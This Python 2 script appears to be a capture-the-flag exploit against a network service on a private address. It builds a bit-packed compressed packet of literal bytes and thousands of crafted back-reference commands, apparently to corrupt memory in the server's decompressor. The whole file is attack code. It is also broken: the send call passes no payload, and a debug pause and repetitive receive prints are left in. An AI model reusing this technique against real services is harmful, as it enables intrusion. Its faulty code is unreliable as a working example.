from socket import *
import struct

p32 = lambda x: struct.pack('I', x)
u32 = lambda x: struct.unpack('I', x)[0]

p64 = lambda x: struct.pack('Q', x)
u64 = lambda x: struct.unpack('Q', x)[0]


class BitWriter:
    @staticmethod
    def bits_reverse(c, n):
        r = 0
        for i in xrange(n):
            r |= ((c >> (n - i - 1)) & 1) << i

        return r

    def __init__(self):
        self.value = 0
        self.offset = 0

    def write(self, value, bits):
        self.value |= BitWriter.bits_reverse(value, bits) << self.offset
        self.offset += bits

    def pack(self):
        ret = ''
        value = self.value
        bytes = ((self.offset + 7) & ~7) >> 3
        while bytes:
            ret += chr(BitWriter.bits_reverse(value & 0xff, 8))
            value >>= 8
            bytes -= 1

        return ret


def main():
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(200.5)
    s.connect(('172.16.120.130', 2323))

    def rn(n):
        r = ''
        while len(r) < n:
            c = s.recv(n - len(r))
            if not c:
                break

            r += c

        return r

    def rw(f):
        r = ''
        while f not in r:
            c = s.recv(1)
            if not c:
                break

            r += c

        return r

    def make_packet(t, d):
        return chr(t) + p32(len(d)) + d

    def read_packet():
        n = u32(rn(4))
        return rn(n)

    w = BitWriter()

    def unpack(offset, length):
        w.write(0, 1)
        w.write(offset, 14)
        w.write(length, 4)

    def putc(c):
        w.write(1, 1)
        w.write(ord(c), 8)

    overwrite = 'LOKIHARDT'.ljust(15, 'C')
    for c in overwrite:
        putc(c)

    for i in xrange(0x1400):
        unpack((1 << 14) - (1 << 4) - 0x31, 15)

    raw_input('xxx')
    payload = make_packet(1, w.pack())
    print payload 
    s.send()
    #s.send('\x01' + p32(0x999))

    #res = read_packet()
    #print hex(len(res))
    #print repr(res)
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))
    print repr(s.recv(4096))

if __name__ == '__main__':
    main()
